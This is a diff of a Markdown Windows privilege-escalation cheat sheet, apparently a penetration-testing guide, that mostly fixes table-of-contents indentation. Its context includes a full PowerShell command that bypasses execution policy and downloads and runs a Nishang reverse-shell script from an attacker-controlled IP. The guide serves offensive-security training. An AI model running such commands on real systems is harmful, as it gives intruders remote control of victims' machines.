@@ -1,28 +1,28 @@
-# Windows-Privilege-Escalation 
+# Windows-Privilege-Escalation
 
 <!-- TOC -->
 
- - [Windows-Privilege-Escalation](#windows-privilege-escalation)
+- [Windows-Privilege-Escalation](#windows-privilege-escalation)
 
-  - [First things first and quick wins](#first-things-first-and-quick-wins)
-  - [Uploading files to the Windows machine](#uploading-files-to-the-windows-machine)
+- [First things first and quick wins](#first-things-first-and-quick-wins)
+- [Uploading files to the Windows machine](#uploading-files-to-the-windows-machine)
 
-    - [Uploading Files with VBScript](#uploading-files-with-vbscript)
-    - [Uploading Files with CertUtil.exe](#uploading-files-with-certutilexe)
-    - [Transfering Files using MSHTA](#transfering-files-using-mshta)
-    - [Trasfering Files using Bitsadmin](#trasfering-files-using-bitsadmin)
-    - [Uploading Files with PowerShell](#uploading-files-with-powershell)
-    - [Uploading Files with Python](#uploading-files-with-python)
-    - [Uploading Files with Perl](#uploading-files-with-perl)
-    - [Uploading Files with FTP](#uploading-files-with-ftp)
-    - [Transfering Files via SMB using Impacket](#transfering-files-via-smb-using-impacket)
+  - [Uploading Files with VBScript](#uploading-files-with-vbscript)
+  - [Uploading Files with CertUtil.exe](#uploading-files-with-certutilexe)
+  - [Transfering Files using MSHTA](#transfering-files-using-mshta)
+  - [Trasfering Files using Bitsadmin](#trasfering-files-using-bitsadmin)
+  - [Uploading Files with PowerShell](#uploading-files-with-powershell)
+  - [Uploading Files with Python](#uploading-files-with-python)
+  - [Uploading Files with Perl](#uploading-files-with-perl)
+  - [Uploading Files with FTP](#uploading-files-with-ftp)
+  - [Transfering Files via SMB using Impacket](#transfering-files-via-smb-using-impacket)
 
-  - [Execute a remote shell dropper](#execute-a-remote-shell-dropper)
+- [Execute a remote shell dropper](#execute-a-remote-shell-dropper)
 
-    - [Upgrading your Windows Shell](#upgrading-your-windows-shell)
-    - [Upgrade Shell with PowerShell Nishang](#upgrade-shell-with-powershell-nishang)
-    - [Upgrade Windows Command Line with a Powershell One-liner Reverse Shell:](#upgrade-windows-command-line-with-a-powershell-one-liner-reverse-shell)
-    - [Netcat Reverseshell Oneliners for Windows](#netcat-reverseshell-oneliners-for-windows)
+  - [Upgrading your Windows Shell](#upgrading-your-windows-shell)
+  - [Upgrade Shell with PowerShell Nishang](#upgrade-shell-with-powershell-nishang)
+  - [Upgrade Windows Command Line with a Powershell One-liner Reverse Shell:](#upgrade-windows-command-line-with-a-powershell-one-liner-reverse-shell)
+  - [Netcat Reverseshell Oneliners for Windows](#netcat-reverseshell-oneliners-for-windows)
 
 - [Windows Enumeration](#windows-enumeration)
 
@@ -47,7 +47,7 @@
 
 - [Other files](#other-files)
 
-  - [Capture a screen shot](#capture-a-screen-shot) 
+  - [Capture a screen shot](#capture-a-screen-shot)
 
 <!-- /TOC -->
 
@@ -387,7 +387,7 @@ And Execute the remote powershell script hosted on your Kali SimpleHTTPServer
 CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
 ```
 
-### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell:
+### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell
 
 You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
 
